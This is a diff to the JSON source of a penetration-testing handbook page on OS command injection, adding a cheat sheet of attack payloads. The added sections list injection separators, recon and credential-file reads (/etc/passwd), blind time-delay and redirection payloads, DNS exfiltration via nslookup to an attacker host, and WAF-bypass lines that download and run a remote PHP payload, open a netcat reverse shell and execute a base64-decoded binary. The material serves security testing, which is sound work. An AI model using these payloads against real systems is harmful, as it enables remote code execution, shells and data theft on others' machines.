@@ -12,14 +12,110 @@
     ],
     "sections": [
         {
-            "heading": "Related Topics",
-            "type": "list",
+            "type": "hint",
+            "variant": "info",
+            "content": "Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. This typically occurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell."
+        },
+        {
+            "heading": "Detection & Entry Points",
+            "type": "code_block",
             "content": [
-                "XSS - Cross-site scripting attacks",
-                "SSRF - Server-side request forgery",
-                "LFI/RFI - File inclusion vulnerabilities",
-                "Web Exploits - RCE exploitation chains",
-                "Reverse Shells - Shell payloads"
+                "# --- Injection Characters ---",
+                "&, ;, \\n (0x0a), &&, |, ||",
+                "Example: https://target.com/api?id=1|whoami",
+                "",
+                "# --- Common Vulnerable Parameters ---",
+                "cmd, exec, command, execute, ping, query, jump, code, reg, do, func, arg,",
+                "option, load, process, step, read, function, req, feature, exe, module, payload, run, print"
+            ]
+        },
+        {
+            "heading": "OS-Specific & Useful Commands",
+            "type": "code_block",
+            "content": [
+                "# --- Linux / Unix ---",
+                "whoami         # Current user",
+                "ifconfig       # Network interfaces",
+                "ls             # List files",
+                "uname -a       # System info",
+                "cat /etc/passwd # Read sensitive files",
+                "",
+                "# --- Windows ---",
+                "whoami         # Current user",
+                "ipconfig       # Network interfaces",
+                "dir            # List files",
+                "ver            # OS version",
+                "type C:\\windows\\win.ini # Read files",
+                "",
+                "# --- Cross-Platform Detection ---",
+                "ls||id; ls ||id; ls|| id; ls || id",
+                "ls|id; ls |id; ls| id; ls | id",
+                "ls&&id; ls &&id; ls&& id; ls && id",
+                "ls&id; ls &id; ls& id; ls & id",
+                "ls %0A id"
+            ]
+        },
+        {
+            "heading": "Advanced Exploitation",
+            "type": "code_block",
+            "content": [
+                "# --- Blind (Time Delay) ---",
+                "& ping -c 10 127.0.0.1 &",
+                "https://target.com/page?p=x||ping+-c+10+127.0.0.1||",
+                "",
+                "# --- Blind (Output Redirection) ---",
+                "& whoami > /var/www/images/output.txt &",
+                "https://target.com/page?p=x||whoami>/var/www/images/output.txt||",
+                "",
+                "# --- Out-of-Band (OOB) / DNS Exfiltration ---",
+                "& nslookup attacker-server.com &",
+                "& nslookup `whoami`.attacker-server.com &",
+                "https://target.com/page?p=x||nslookup+`whoami`.burp.collaborator.address||"
+            ]
+        },
+        {
+            "heading": "Filter & WAF Bypass",
+            "type": "code_block",
+            "content": [
+                "# --- WAF Bypasses ---",
+                "vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php",
+                "vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>",
+                "vuln=echo PAYLOAD | base64 -d > /tmp/payload; chmod +x /tmp/payload; /tmp/payload",
+                "",
+                "# --- Path & String Bypasses ---",
+                "cat /etc/passwd",
+                "cat /e\"t\"c/pa\"s\"swd      # Double quotes",
+                "cat /'e'tc/pa's'swd      # Single quotes",
+                "cat /etc/pa??wd          # Wildcards",
+                "cat /etc/pa*wd           # Asterisk",
+                "{cat,/etc/passwd}        # Braces expansion",
+                "cat /???/?????d          # Full path wildcarding"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "links",
+            "links": [
+                {
+                    "title": "XSS - Cross-site scripting attacks",
+                    "url": "/enumeration/web/xss"
+                },
+                {
+                    "title": "SSRF - Server-side request forgery",
+                    "url": "/enumeration/web/ssrf"
+                },
+                {
+                    "title": "LFI/RFI - File inclusion vulnerabilities",
+                    "url": "/enumeration/web/lfi-rfi"
+                },
+                {
+                    "title": "Reverse Shells - Shell payloads",
+                    "url": "/exploitation/reverse-shells"
+                },
+                {
+                    "title": "Commix - Automated OS Command Injection Tool",
+                    "url": "https://github.com/commixproject/commix"
+                }
             ]
         }
     ],
@@ -27,26 +123,10 @@
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2026-02-03T14:05:45.496Z",
+        "last_updated": "2026-04-22T18:14:35Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/command-injection.md",
         "previous_page": {
             "title": "Prototype Pollution",
